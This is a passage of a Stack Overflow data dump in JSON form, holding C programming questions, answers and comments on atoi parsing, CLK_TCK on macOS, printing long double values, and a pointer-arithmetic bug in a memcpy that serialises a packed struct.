strlen(x));\n\n    for ( int i = 0; i &lt; strlen(x); i+=3 ) {\n        char num[2];\n        num[0] = (char)x[i];\n        num[1] = (char)x[i+1];\n        printf(\"%d, \", atoi(num));\n    }\n\n}\n</code></pre>\n\n<p>The Output:</p>\n\n<pre><code>8, 2, 22, 97, 38, 15, 0, 40, 0, 75, 4, 5, 7, 78, 52, 12, 500, 773, 916, 89, \n</code></pre>\n\n<p>Everything is great until.....500, 773, 916, 89...what is happening?</p>\n"}, {"tags": ["c", "macos", "time.h"], "comments": [{"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 3, "creation_date": 1461758300, "post_id": 36888937, "comment_id": 61342426, "body": "By using <code>CLOCKS_PER_SEC</code>? Please read the man page for <code>clock()</code>."}, {"owner": {"reputation": 19601, "user_id": 1620779, "user_type": "registered", "accept_rate": 74, "profile_image": "https://i.stack.imgur.com/dlgGb.png?s=128&g=1", "display_name": "sjsam", "link": "https://stackoverflow.com/users/1620779/sjsam"}, "edited": false, "score": 0, "creation_date": 1461759653, "post_id": 36888937, "comment_id": 61343511, "body": "Possible duplicate of <a href=\"http://stackoverflow.com/questions/9871071/why-c-clock-returns-0\">this</a>"}], "answers": [{"comments": [{"owner": {"reputation": 2021, "user_id": 6536335, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-buZs4yDMhtE/AAAAAAAAAAI/AAAAAAAAABI/4apuEbD4X3c/photo.jpg?sz=128", "display_name": "Ali David", "link": "https://stackoverflow.com/users/6536335/ali-david"}, "edited": false, "score": 0, "creation_date": 1571923767, "post_id": 58542087, "comment_id": 103406416, "body": "A copy of comment is not suitable for posts."}], "tags": [], "owner": {"reputation": 11, "user_id": 8457866, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c1cfb0ba9586548a31de91d9aca5a1f6?s=128&d=identicon&r=PG&f=1", "display_name": "nick", "link": "https://stackoverflow.com/users/8457866/nick"}, "is_accepted": false, "score": 1, "last_activity_date": 1571922477, "creation_date": 1571922477, "answer_id": 58542087, "question_id": 36888937, "link": "https://stackoverflow.com/questions/36888937/clk-tck-undeclared-on-mac/58542087#58542087", "title": "CLK_TCK undeclared on Mac", "body": "<p>Use <code>CLOCKS_PER_SEC</code> instead of <code>CLK_TCK</code> on mac.</p>\n"}], "owner": {"reputation": 490, "user_id": 4814899, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/7108c80cedb7515a9f6cdf2b9d9ed9ce?s=128&d=identicon&r=PG&f=1", "display_name": "XiaXuehai", "link": "https://stackoverflow.com/users/4814899/xiaxuehai"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1195, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1571922477, "creation_date": 1461757801, "question_id": 36888937, "link": "https://stackoverflow.com/questions/36888937/clk-tck-undeclared-on-mac", "title": "CLK_TCK undeclared on Mac", "body": "<pre><code>#include &lt;stdio.h&gt;\n#include &lt;time.h&gt;\n\nclock_t start, stop;\n\nint main(){\n    start = clock();\n    function();\n    stop = clock();\n    double duration = (stop - start)/CLK_TCK;\n    return 0;\n}\n</code></pre>\n\n<p>I got a problem in Xcode. CLK_TCK undeclared.\nhow to fix it?</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 469, "user_id": 6012315, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/d7f2484ba51df08ea30569f351afe958?s=128&d=identicon&r=PG&f=1", "display_name": "Schafwolle", "link": "https://stackoverflow.com/users/6012315/schafwolle"}, "edited": false, "score": 4, "creation_date": 1461757260, "post_id": 36888696, "comment_id": 61341648, "body": "Why are you using the C# tag?"}, {"owner": {"reputation": 11, "user_id": 6536892, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-nSKBub1X0R4/AAAAAAAAAAI/AAAAAAAAC_s/myjUysBGZXs/photo.jpg?sz=128", "display_name": " Pv vimal nair", "link": "https://stackoverflow.com/users/6536892/pv-vimal-nair"}, "reply_to_user": {"reputation": 469, "user_id": 6012315, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/d7f2484ba51df08ea30569f351afe958?s=128&d=identicon&r=PG&f=1", "display_name": "Schafwolle", "link": "https://stackoverflow.com/users/6012315/schafwolle"}, "edited": false, "score": 0, "creation_date": 1461757340, "post_id": 36888696, "comment_id": 61341715, "body": "which tag should i use for this Question"}, {"owner": {"reputation": 6508, "user_id": 5962841, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/qD8gs.jpg?s=128&g=1", "display_name": "Mafii", "link": "https://stackoverflow.com/users/5962841/mafii"}, "edited": false, "score": 3, "creation_date": 1461757430, "post_id": 36888696, "comment_id": 61341787, "body": "@PvVimalNair the tag that fits the question. C"}, {"owner": {"reputation": 8833, "user_id": 337149, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/3bbd41f2b74254f902cfe20acef9030b?s=128&d=identicon&r=PG", "display_name": "August Karlstrom", "link": "https://stackoverflow.com/users/337149/august-karlstrom"}, "edited": false, "score": 3, "creation_date": 1461758583, "post_id": 36888696, "comment_id": 61342652, "body": "Your main problem here is that you don&#39;t compile your program with (enough) warnings enabled."}], "answers": [{"comments": [{"owner": {"reputation": 11, "user_id": 6536892, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-nSKBub1X0R4/AAAAAAAAAAI/AAAAAAAAC_s/myjUysBGZXs/photo.jpg?sz=128", "display_name": " Pv vimal nair", "link": "https://stackoverflow.com/users/6536892/pv-vimal-nair"}, "edited": false, "score": 0, "creation_date": 1461757567, "post_id": 36888765, "comment_id": 61341875, "body": "send me full code, tried this one but not getting proper value."}, {"owner": {"reputation": 59603, "user_id": 60281, "user_type": "registered", "accept_rate": 98, "profile_image": "https://www.gravatar.com/avatar/29ebf39f3857b4fc4f51e93e7b9c4af4?s=128&d=identicon&r=PG", "display_name": "DevSolar", "link": "https://stackoverflow.com/users/60281/devsolar"}, "reply_to_user": {"reputation": 11, "user_id": 6536892, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-nSKBub1X0R4/AAAAAAAAAAI/AAAAAAAAC_s/myjUysBGZXs/photo.jpg?sz=128", "display_name": " Pv vimal nair", "link": "https://stackoverflow.com/users/6536892/pv-vimal-nair"}, "edited": false, "score": 7, "creation_date": 1461757731, "post_id": 36888765, "comment_id": 61341999, "body": "@PvVimalNair: What value do you get, what value would you expect? Come on, that&#39;s debugging 101, really. I get <code>1.189731e+4932</code> / <code>3.362103e-4932</code>, which looks good to me."}, {"owner": {"reputation": 59603, "user_id": 60281, "user_type": "registered", "accept_rate": 98, "profile_image": "https://www.gravatar.com/avatar/29ebf39f3857b4fc4f51e93e7b9c4af4?s=128&d=identicon&r=PG", "display_name": "DevSolar", "link": "https://stackoverflow.com/users/60281/devsolar"}, "reply_to_user": {"reputation": 11, "user_id": 6536892, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-nSKBub1X0R4/AAAAAAAAAAI/AAAAAAAAC_s/myjUysBGZXs/photo.jpg?sz=128", "display_name": " Pv vimal nair", "link": "https://stackoverflow.com/users/6536892/pv-vimal-nair"}, "edited": false, "score": 4, "creation_date": 1461757822, "post_id": 36888765, "comment_id": 61342073, "body": "@PvVimalNair: And while we&#39;re at it, if you&#39;re printing the result of <code>sizeof</code> (or any <code>size_t</code>, really), you should be using <code>%zu</code>, since <code>size_t</code> is not guaranteed to have the same width as an <code>int</code>, and is unsigned."}, {"owner": {"reputation": 11, "user_id": 6536892, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-nSKBub1X0R4/AAAAAAAAAAI/AAAAAAAAC_s/myjUysBGZXs/photo.jpg?sz=128", "display_name": " Pv vimal nair", "link": "https://stackoverflow.com/users/6536892/pv-vimal-nair"}, "edited": false, "score": 0, "creation_date": 1461758034, "post_id": 36888765, "comment_id": 61342218, "body": "i am getting the same value, But this is the real answer long double\t&#39;10 byte\t3.4E-4932 to 1.1E+4932\t19 decimal places"}, {"owner": {"reputation": 59603, "user_id": 60281, "user_type": "registered", "accept_rate": 98, "profile_image": "https://www.gravatar.com/avatar/29ebf39f3857b4fc4f51e93e7b9c4af4?s=128&d=identicon&r=PG", "display_name": "DevSolar", "link": "https://stackoverflow.com/users/60281/devsolar"}, "reply_to_user": {"reputation": 11, "user_id": 6536892, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-nSKBub1X0R4/AAAAAAAAAAI/AAAAAAAAC_s/myjUysBGZXs/photo.jpg?sz=128", "display_name": " Pv vimal nair", "link": "https://stackoverflow.com/users/6536892/pv-vimal-nair"}, "edited": false, "score": 2, "creation_date": 1461758151, "post_id": 36888765, "comment_id": 61342315, "body": "@PvVimalNair: What makes you think that&#39;d be the output to expect? <b>On which platform / compiler?</b> 10 byte, <i>really</i>? And have you ever heard of rounding?"}, {"owner": {"reputation": 11, "user_id": 6536892, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-nSKBub1X0R4/AAAAAAAAAAI/AAAAAAAAC_s/myjUysBGZXs/photo.jpg?sz=128", "display_name": " Pv vimal nair", "link": "https://stackoverflow.com/users/6536892/pv-vimal-nair"}, "edited": false, "score": 0, "creation_date": 1461758495, "post_id": 36888765, "comment_id": 61342575, "body": "<a href=\"http://www.tutorialspoint.com/cprogramming/c_data_types.htm\" rel=\"nofollow noreferrer\">tutorialspoint.com/cprogramming/c_data_types.htm</a>  ... this is the link bro please see and let me know if you found something.. and i am using online compiler ideone.com"}, {"owner": {"reputation": 16507, "user_id": 4787126, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2a822df86c907c77c792a8f91b2bab41?s=128&d=identicon&r=PG&f=1", "display_name": "Zbynek Vyskovsky - kvr000", "link": "https://stackoverflow.com/users/4787126/zbynek-vyskovsky-kvr000"}, "reply_to_user": {"reputation": 11, "user_id": 6536892, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-nSKBub1X0R4/AAAAAAAAAAI/AAAAAAAAC_s/myjUysBGZXs/photo.jpg?sz=128", "display_name": " Pv vimal nair", "link": "https://stackoverflow.com/users/6536892/pv-vimal-nair"}, "edited": false, "score": 1, "creation_date": 1461758586, "post_id": 36888765, "comment_id": 61342655, "body": "@PvVimalNair : 10 bytes might have been true for old DOS programs which didn&#39;t require any alignment. On any modern processor size of <code>long double</code> is still 10 bytes but it has to be aligned to either 4 or 8 bytes, so the <code>sizeof()</code> operator should return 12 or 16. Regarding the compiler - ideone.com is just kind of emulator and it may miss lot of standard stuff, including the formatting characters, correct type alignment and things like that. Use real compiler to get real results."}, {"owner": {"reputation": 59603, "user_id": 60281, "user_type": "registered", "accept_rate": 98, "profile_image": "https://www.gravatar.com/avatar/29ebf39f3857b4fc4f51e93e7b9c4af4?s=128&d=identicon&r=PG", "display_name": "DevSolar", "link": "https://stackoverflow.com/users/60281/devsolar"}, "reply_to_user": {"reputation": 11, "user_id": 6536892, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-nSKBub1X0R4/AAAAAAAAAAI/AAAAAAAAC_s/myjUysBGZXs/photo.jpg?sz=128", "display_name": " Pv vimal nair", "link": "https://stackoverflow.com/users/6536892/pv-vimal-nair"}, "edited": false, "score": 1, "creation_date": 1461758694, "post_id": 36888765, "comment_id": 61342749, "body": "@PvVimalNair: Drop those online tutorials <b>right now</b>. They are not good for your health. All that the C language actually guarantees for <code>long double</code> is a value range of no less than 1E-37 to 1E+37, and no less than that of <code>double</code>. The <b>only</b> authority on these things is <a href=\"http://www.open-std.org/jtc1/sc22/wg14/www/docs/n1570.pdf\" rel=\"nofollow noreferrer\">the C standard itself</a>. Which, by the way, also allows for 128-bit <code>long double</code> <i>on platforms that support it</i>. Your tutorial is chock full of invalid assumptions, like two&#39;s complement, 8-bit <code>char</code> etc., and obviously not recent (no mention of <code>long long</code>)."}, {"owner": {"reputation": 11, "user_id": 6536892, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-nSKBub1X0R4/AAAAAAAAAAI/AAAAAAAAC_s/myjUysBGZXs/photo.jpg?sz=128", "display_name": " Pv vimal nair", "link": "https://stackoverflow.com/users/6536892/pv-vimal-nair"}, "edited": false, "score": 0, "creation_date": 1461758914, "post_id": 36888765, "comment_id": 61342907, "body": "ok  guys thank you very much, can you tell me any good compiler"}, {"owner": {"reputation": 59603, "user_id": 60281, "user_type": "registered", "accept_rate": 98, "profile_image": "https://www.gravatar.com/avatar/29ebf39f3857b4fc4f51e93e7b9c4af4?s=128&d=identicon&r=PG", "display_name": "DevSolar", "link": "https://stackoverflow.com/users/60281/devsolar"}, "reply_to_user": {"reputation": 11, "user_id": 6536892, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-nSKBub1X0R4/AAAAAAAAAAI/AAAAAAAAC_s/myjUysBGZXs/photo.jpg?sz=128", "display_name": " Pv vimal nair", "link": "https://stackoverflow.com/users/6536892/pv-vimal-nair"}, "edited": false, "score": 0, "creation_date": 1461758934, "post_id": 36888765, "comment_id": 61342923, "body": "@PvVimalNair: Nothing wrong with your compiler, it&#39;s the tutorial that&#39;s broken. (Most are, actually.)"}, {"owner": {"reputation": 11, "user_id": 6536892, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-nSKBub1X0R4/AAAAAAAAAAI/AAAAAAAAC_s/myjUysBGZXs/photo.jpg?sz=128", "display_name": " Pv vimal nair", "link": "https://stackoverflow.com/users/6536892/pv-vimal-nair"}, "edited": false, "score": 0, "creation_date": 1461759016, "post_id": 36888765, "comment_id": 61342987, "body": "one more thing what is %Le ?"}, {"owner": {"reputation": 59603, "user_id": 60281, "user_type": "registered", "accept_rate": 98, "profile_image": "https://www.gravatar.com/avatar/29ebf39f3857b4fc4f51e93e7b9c4af4?s=128&d=identicon&r=PG", "display_name": "DevSolar", "link": "https://stackoverflow.com/users/60281/devsolar"}, "reply_to_user": {"reputation": 11, "user_id": 6536892, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-nSKBub1X0R4/AAAAAAAAAAI/AAAAAAAAC_s/myjUysBGZXs/photo.jpg?sz=128", "display_name": " Pv vimal nair", "link": "https://stackoverflow.com/users/6536892/pv-vimal-nair"}, "edited": false, "score": 2, "creation_date": 1461759093, "post_id": 36888765, "comment_id": 61343046, "body": "@PvVimalNair: Please <b>do</b> read <a href=\"http://en.cppreference.com/w/c/io/fprintf\" rel=\"nofollow noreferrer\">the documentation</a> on functions you&#39;re using. (The table halfway down the page. Pay attention to the rightmost column.)"}], "tags": [], "owner": {"reputation": 16507, "user_id": 4787126, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2a822df86c907c77c792a8f91b2bab41?s=128&d=identicon&r=PG&f=1", "display_name": "Zbynek Vyskovsky - kvr000", "link": "https://stackoverflow.com/users/4787126/zbynek-vyskovsky-kvr000"}, "is_accepted": true, "score": 9, "last_activity_date": 1461757748, "last_edit_date": 1461757748, "creation_date": 1461757360, "answer_id": 36888765, "question_id": 36888696, "link": "https://stackoverflow.com/questions/36888696/c-programming-not-getting-proper-value-of-long-double/36888765#36888765", "title": "c programming, not getting proper value of long double", "body": "<p>You need to use <code>L</code> flag (<code>%Le</code>) to signify that you pass <code>long double</code>:</p>\n\n<pre><code>printf(\"minimum long double positive value of %Le \\n\", LDBL_MAX);\nprintf(\"maximum long double positive value of %Le \\n\", LDBL_MIN); \n</code></pre>\n\n<p>Otherwise the original code gets part of the <code>long double</code> from the stack and interprets it as <code>double</code> which clearly becomes a mess.</p>\n"}], "owner": {"reputation": 11, "user_id": 6536892, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-nSKBub1X0R4/AAAAAAAAAAI/AAAAAAAAC_s/myjUysBGZXs/photo.jpg?sz=128", "display_name": " Pv vimal nair", "link": "https://stackoverflow.com/users/6536892/pv-vimal-nair"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 231, "favorite_count": 0, "accepted_answer_id": 36888765, "answer_count": 1, "score": -18, "last_activity_date": 1461762782, "creation_date": 1461757127, "last_edit_date": 1461762782, "question_id": 36888696, "link": "https://stackoverflow.com/questions/36888696/c-programming-not-getting-proper-value-of-long-double", "title": "c programming, not getting proper value of long double", "body": "<pre><code>#include &lt;stdio.h&gt;            \n#include &lt;float.h&gt;        \n\nint main () {      \n    printf(\"storage size of long double %d \\n\", sizeof(long double));  \n    printf(\"minimum long double positive value of %e \\n\", LDBL_MAX); \n    printf(\"maximum long double positive value of %e \\n\", LDBL_MIN); \n    printf(\"Precision value of %d\", LDBL_DIG);        \n    return 0;     \n}       \n</code></pre>\n\n<p>Here's the output</p>\n\n<pre><code>Success time: 0 memory: 2160 signal:0    \n\nstorage size of long double 12     \n\nmaximum long double positive value of -nan     \n\nminimum long double positive value of -0.000000e+00   \n\nPrecision value of 18\n\n\nfloat   4 byte  1.2E-38 to 3.4E+38  6 decimal places        \ndouble  8 byte  2.3E-308 to 1.7E+308    15 decimal places        \nlong double 10 byte 3.4E-4932 to 1.1E+4932  19 decimal places        \n</code></pre>\n\n<p>I am getting the right value for <code>float</code> and <code>double</code> but not with <code>long double</code>; what am I doing wrong?</p>\n"}, {"tags": ["c", "pointers", "memory"], "comments": [{"owner": {"reputation": 195333, "user_id": 253056, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/1977cbe0ac5ffec4f6ee5ee24363988a?s=128&d=identicon&r=PG", "display_name": "Paul R", "link": "https://stackoverflow.com/users/253056/paul-r"}, "edited": false, "score": 4, "creation_date": 1461757104, "post_id": 36888633, "comment_id": 61341535, "body": "Welcome to Stack Overflow! It sounds like you may need to learn how to use a debugger to step through your code. With a good debugger, you can execute your program line by line and see where it is deviating from what you expect. This is an essential tool if you are going to do any programming. Further reading: <a href=\"http://ericlippert.com/2014/03/05/how-to-debug-small-programs/\" rel=\"nofollow noreferrer\">How to debug small programs</a>."}, {"owner": {"reputation": 521, "user_id": 6105387, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f1add32f616019ef3e191f1aaeb59dd1?s=128&d=identicon&r=PG", "display_name": "chrisd1100", "link": "https://stackoverflow.com/users/6105387/chrisd1100"}, "edited": false, "score": 1, "creation_date": 1461757409, "post_id": 36888633, "comment_id": 61341765, "body": "Is it wise to offset into structs like that? Is the ordering of the members guaranteed by C? For simplicity sake, could you not remove MSG_HEADER from MSG_CONFIGURATION and send them separately, and avoid offsetting into structs like that."}, {"owner": {"reputation": 13762, "user_id": 694733, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/0a3de8cd40d9ffb86cc1fed0c8cf2e19?s=128&d=identicon&r=PG", "display_name": "user694733", "link": "https://stackoverflow.com/users/694733/user694733"}, "edited": false, "score": 3, "creation_date": 1461757546, "post_id": 36888633, "comment_id": 61341862, "body": "Do you know what <code>&amp;config+sizeof(MSG_HEADER)</code> does? It advances the address <code>&amp;config</code> by <code>sizeof(MSG_HEADER)*sizeof(MSG_CONFIGURATION)</code> bytes. I don&#39;t think that&#39;s what you want."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 1, "creation_date": 1461757654, "post_id": 36888633, "comment_id": 61341935, "body": "You don&#39;t serialise, but just reinterpret. Use correct serialisation with bitops&amp;shifts. And the C standard does not define the behaviour of that pragma (or most others)"}], "answers": [{"comments": [{"owner": {"reputation": 129565, "user_id": 1505939, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/131c67ef492a8d8352c6cf642a52e20f?s=128&d=identicon&r=PG", "display_name": "M.M", "link": "https://stackoverflow.com/users/1505939/m-m"}, "edited": false, "score": 0, "creation_date": 1461758342, "post_id": 36888967, "comment_id": 61342463, "body": "Logically it should probably be <code>&amp;copyconfig.clear_type</code> regardless of packing"}, {"owner": {"reputation": 14469, "user_id": 2191105, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/tPiCW.png?s=128&g=1", "display_name": "David Hoelzer", "link": "https://stackoverflow.com/users/2191105/david-hoelzer"}, "edited": false, "score": 0, "creation_date": 1461759530, "post_id": 36888967, "comment_id": 61343375, "body": "Compiler warnings for the win."}, {"owner": {"reputation": 8058, "user_id": 619818, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/qzq4k.jpg?s=128&g=1", "display_name": "Angus Comber", "link": "https://stackoverflow.com/users/619818/angus-comber"}, "edited": false, "score": 1, "creation_date": 1461760122, "post_id": 36888967, "comment_id": 61343921, "body": "Ah yes, because + 3 is increment over 3 MSG_CONFIGURATION&#39;s. Which makes sense when iterating over arrays - but not in my case.  Yes next time I will examine the addresses."}, {"owner": {"reputation": 32303, "user_id": 4386427, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d2d2716ce8bcf5967e7b3c00bd0095b5?s=128&d=identicon&r=PG&f=1", "display_name": "4386427", "link": "https://stackoverflow.com/users/4386427/4386427"}, "edited": false, "score": 0, "creation_date": 1461766188, "post_id": 36888967, "comment_id": 61348870, "body": "Quote: <code>but it actually adds N instances of MSG_HEADER</code> - why? The code says <code>MSG_CONFIGURATION copyconfig;</code> so isn&#39;t it N instances of MSG_CONFIGURATION?"}, {"owner": {"reputation": 205167, "user_id": 4323, "user_type": "registered", "accept_rate": 82, "profile_image": "https://i.stack.imgur.com/qqgFU.png?s=128&g=1", "display_name": "John Zwinck", "link": "https://stackoverflow.com/users/4323/john-zwinck"}, "reply_to_user": {"reputation": 32303, "user_id": 4386427, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d2d2716ce8bcf5967e7b3c00bd0095b5?s=128&d=identicon&r=PG&f=1", "display_name": "4386427", "link": "https://stackoverflow.com/users/4386427/4386427"}, "edited": false, "score": 0, "creation_date": 1461806496, "post_id": 36888967, "comment_id": 61371056, "body": "@4386427: You&#39;re right, I&#39;ve fixed that now.  Thanks for pointing out the mistake."}], "tags": [], "owner": {"reputation": 205167, "user_id": 4323, "user_type": "registered", "accept_rate": 82, "profile_image": "https://i.stack.imgur.com/qqgFU.png?s=128&g=1", "display_name": "John Zwinck", "link": "https://stackoverflow.com/users/4323/john-zwinck"}, "is_accepted": true, "score": 4, "last_activity_date": 1461806479, "last_edit_date": 1495541257, "creation_date": 1461757871, "answer_id": 36888967, "question_id": 36888633, "link": "https://stackoverflow.com/questions/36888633/why-does-this-memory-copy-of-a-struct-not-copy-bytes-to-byte-stream-as-expected/36888967#36888967", "title": "Why does this memory copy of a struct not copy bytes to byte stream as expected?", "body": "<p>My compiler instantly told me what was wrong:</p>\n\n<pre><code>warning: '__builtin___memcpy_chk' will always overflow destination buffer [-Wbuiltin-memcpy-chk-size]\n    memcpy(&amp;copyconfig+sizeof(MSG_HEADER), tchu_msg.data, sizeof(MSG_CONFIGURATION) - sizeof(MSG_HEADER));\n</code></pre>\n\n<p>Why is that?  Well, let's look at the destination:</p>\n\n<pre><code>&amp;copyconfig + sizeof(MSG_HEADER)\n</code></pre>\n\n<p>That means \"Take the address of <code>copyconfig</code>, treat it as an array, and take the Nth object where N is <code>sizeof(MSG_HEADER)</code>.  I think you thought it would add N bytes, but it actually adds N instances of <code>MSG_CONFIGURATION</code>.  Instead, use this:  </p>\n\n<pre><code>&amp;copyconfig.header + 1\n</code></pre>\n\n<p>That is, \"Take the address of <code>copyconfig.header</code> and go to just beyond it.\"</p>\n\n<p>You could equally do this:</p>\n\n<pre><code>(char*)&amp;copyconfig + sizeof(MSG_HEADER)\n</code></pre>\n\n<p>Because the size of one <code>char</code> is one byte.  Or, since your struct is packed:</p>\n\n<pre><code>&amp;copyconfig.clear_type\n</code></pre>\n\n<p>Because that's the address of the first byte you actually want to copy into.</p>\n\n<p>For more details, read: <a href=\"https://stackoverflow.com/questions/394767/pointer-arithmetic\">Pointer Arithmetic</a> .</p>\n"}], "owner": {"reputation": 8058, "user_id": 619818, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/qzq4k.jpg?s=128&g=1", "display_name": "Angus Comber", "link": "https://stackoverflow.com/users/619818/angus-comber"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 100, "favorite_count": 0, "accepted_answer_id": 36888967, "answer_count": 1, "score": -3, "last_activity_date": 1461806479, "creation_date": 1461756962, "last_edit_date": 1461757004, "question_id": 36888633, "link": "https://stackoverflow.com/questions/36888633/why-does-this-memory-copy-of-a-struct-not-copy-bytes-to-byte-stream-as-expected", "title": "Why does this memory copy of a struct not copy bytes to byte stream as expected?", "body": "<p>I need to serialise a struct and I am trying to do this using memcpy.  But it is not working.  I can tell by looking at the byte stream - I see garbage characters.  Why?</p>\n\n<p>Also I get runtime error:</p>\n\n<blockquote>\n  <p>Run-Time Check Failure #2 - Stack around the variable 'addresses' was corrupted.</p>\n</blockquote>\n\n<p>What is happening and how can I fix this?</p>\n\n<p>I am using <code>#pragma pack(push, 1)</code> which I thought would mean there would be no padding of the structs.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#include &lt;stdint.h&gt;\n\n#pragma pack(push, 1)  /* padding has to be disabled for casting to struct to work at other end */\ntypedef struct {\n    uint8_t             start_char; \n    uint8_t             msg_type;      \n    uint8_t             length;     \n} MSG_HEADER;\n\ntypedef struct {\n    uint8_t         denomination[6];   \n    uint8_t         path;    \n    uint8_t         min_level; \n    uint16_t        max_level;     \n    uint16_t        weight;    \n    uint8_t         address;  \n} CONFIG_DATA;\n\ntypedef struct {\n    MSG_HEADER            header;\n    uint8_t               clear_type;  \n    CONFIG_DATA           config_data[12]; \n    uint8_t               system_algorithm; \n    uint8_t               max_transaction;   \n} MSG_CONFIGURATION;\n#pragma pack(pop) /* only affect this file */\n\ntypedef struct {\n    unsigned char data[256];\n    size_t length;\n    int msg_type;\n} TCHU_MESSAGE;\n\nenum DRM_MESSAGE_TYPE { \n    CONFIG, CLEAR_COUNT, DISPENSE, CANCEL_TRANSACTION };\n\nvoid TestCopy()\n{\n    MSG_CONFIGURATION config;\n\n    config.clear_type = 0;  \n    config.system_algorithm = 0;\n    config.max_transaction = 17;\n\n    const int NumItems = 12;\n    const uint16_t maxLevel = 300;\n\n    static const char* denoms[] = { \"GB005A\",\"GB005B\",\"GB010A\",\"GB010B\",\n        \"GB020A\",\"GB050A\",\"GB050B\",\"GB100A\",\n        \"GB100B\",\"GB200A\", \"EU100A\", \"EU100B\" };\n\n    const uint8_t addresses[] =     { 0, 0, 5, 5, 0, 7, 7, 8, 8, 9, 0, 0 };\n    const uint8_t sorting_paths[] = { 5, 5, 4, 4, 5, 2, 2, 1, 1, 3, 0, 0 };\n\n    for(int i = 0; i &lt; NumItems; ++i) {\n        memcpy(config.config_data[i].denomination, denoms[i], 6);\n        config.config_data[i].address = addresses[i];\n        config.config_data[i].path = sorting_paths[i];\n        config.config_data[i].min_level = 3;\n        config.config_data[i].max_level = maxLevel;\n        config.config_data[i].weight = 1000;\n    }\n\n    config.header.start_char = 1;\n    config.header.msg_type = 2;\n    config.header.length = sizeof(MSG_CONFIGURATION);\n\n    TCHU_MESSAGE tchu_msg = {0};\n\n    // why does the memcpy not work?  How can I get it to work?\n    memcpy(tchu_msg.data, &amp;config+sizeof(MSG_HEADER), sizeof(MSG_CONFIGURATION) - sizeof(MSG_HEADER));\n\n    printf(\"sizeof(MSG_HEADER) = %u\\n\", sizeof(MSG_HEADER));\n    printf(\"sizeof(MSG_CONFIGURATION) = %u\\n\", sizeof(MSG_CONFIGURATION));\n\n    // get garbage in copyconfig\n    MSG_CONFIGURATION copyconfig;\n    memcpy(&amp;copyconfig+sizeof(MSG_HEADER), tchu_msg.data, sizeof(MSG_CONFIGURATION) - sizeof(MSG_HEADER));\n\n    if(copyconfig.header.start_char != config.header.start_char)\n    {\n        // we get to here\n        printf(\"mismatch between original and copy\\n\");\n    }\n}\n\nint main() {\n\n    TestCopy();\n\n    // I also get Run-Time Check Failure #2 - Stack around the variable 'addresses' was corrupted.\n    // when program ends\n}\n</code></pre>\n"}, {"tags": ["javascript", "c", "algorithm"], "comments": [{"owner": {"reputation": 60727, "user_id": 1984039, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/d6da57aad344d1dceec183610a788a86?s=128&d=identicon&r=PG", "display_name": "gurvinder372", "link": "https://stackoverflow.com/users/1984039/gurvinder372"}, "edited": false, "score": 0, "creation_date": 1461756323, "post_id": 36888335, "comment_id": 61340994, "body": "is this matrix a 2d array?"}, {"owner": {"reputation": 3448, "user_id": 2154839, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/79c9780d30d201ab911ae86c74f71cf5?s=128&d=identicon&r=PG", "display_name": "Georgi-it", "link": "https://stackoverflow.com/users/2154839/georgi-it"}, "edited": false, "score": 0, "creation_date": 1461756364, "post_id": 36888335, "comment_id": 61341022, "body": "Are the entries unique?"}, {"owner": {"reputation": 26941, "user_id": 2979617, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/whfql.png?s=128&g=1", "display_name": "M Oehm", "link": "https://stackoverflow.com/users/2979617/m-oehm"}, "edited": false, "score": 1, "creation_date": 1461756385, "post_id": 36888335, "comment_id": 61341038, "body": "Is the order absolute, i.e. if 